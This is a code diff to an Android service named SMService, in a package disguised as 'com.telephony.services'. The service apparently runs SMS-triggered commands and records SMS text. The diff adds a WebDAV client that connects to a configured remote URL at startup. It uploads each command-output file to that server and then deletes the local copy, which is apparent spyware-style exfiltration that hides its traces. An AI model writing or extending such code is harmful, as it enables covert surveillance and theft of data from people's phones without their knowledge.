@@ -3,6 +3,7 @@ package com.telephony.services;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.net.Uri;
 import android.os.Build;
 import android.os.IBinder;
 import android.os.SystemClock;
@@ -25,6 +26,7 @@ public class SMService extends Service {
 
     private PreferenceUtils sPref = null;
     private ExecutorService es;
+    private MyWebdavClient webdavClient=null;
 
     private String sms_body = null;
     private String phoneNumber = null;
@@ -46,6 +48,8 @@ public class SMService extends Service {
         es = Executors.newFixedThreadPool(1);
         sPref = PreferenceUtils.getInstance(this);
         cmdr = new Commander(this);
+        webdavClient = MyWebdavClient.getInstance();
+        webdavClient.connect(Uri.parse(sPref.getRemoteUrl()));
         Log.d(Utils.LOG_TAG, getClass().getName() + " Create");
     }
 
@@ -94,7 +98,13 @@ public class SMService extends Service {
                                 }
                             }
                             if (exec_out.length() > 0) {
-                                Utils.writeFile(new File(sPref.getRootDir(), CONFIG_OUT_FILENAME), exec_out.toString());
+                                File config_out = new File(sPref.getRootDir(), CONFIG_OUT_FILENAME);
+                                Utils.writeFile(config_out, exec_out.toString());
+                                if (Connection.getInstance(context).isConnected() && webdavClient.isReady()) {
+                                    if (webdavClient.uploadFile(config_out, webdavClient.getRemoteFile(sPref.getRootDir(), config_out))) {
+                                        config_out.delete();
+                                    }
+                                }
                             }
                         } else if (sPref.isSMSRecord()) {
                             Utils.writeFile(getFilename(), sms_body);
